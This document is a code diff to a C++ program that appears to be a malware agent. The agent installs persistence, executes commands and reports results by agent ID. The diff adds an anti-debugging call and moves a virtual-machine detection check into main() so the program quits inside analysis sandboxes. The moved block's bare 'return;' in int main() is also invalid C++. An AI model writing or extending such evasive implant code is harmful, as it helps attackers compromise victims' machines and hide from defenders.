@@ -12,7 +12,7 @@
 #include "pe-exec.h"
 #include "file_utils.h"
 #include "persistence.h"
-
+#include "debug_detection.h"
 using namespace std;
 
 #ifdef ANTI_VM_ENABLED
@@ -338,15 +338,6 @@ bool submit_result(const string& agent_id, int64_t command_id, const string& out
 void agent_run() {
     setvbuf(stdout, NULL, _IONBF, 0);
 
-    #ifdef ANTI_VM_ENABLED
-    if (is_virtual_machine()) {
-        #ifdef _DEBUG
-        cerr << "[!] Virtual machine detected. Exiting." << endl;
-        #endif
-        return;
-    }
-    #endif
-
     if (!is_persistence_installed()) {
         #ifdef _DEBUG
         cout << "[*] Installing persistence..." << endl;
@@ -590,6 +581,18 @@ void agent_run() {
 }
 
 int main() {
+    #ifdef ANTI_DEBUG_ENABLED
+    anti_debug_basic();
+    #endif
+
+    #ifdef ANTI_VM_ENABLED
+    if (is_virtual_machine()) {
+        #ifdef _DEBUG
+        cerr << "[!] Virtual machine detected. Exiting." << endl;
+        #endif
+        return;
+    }
+    #endif
     try {
         agent_run();
     }
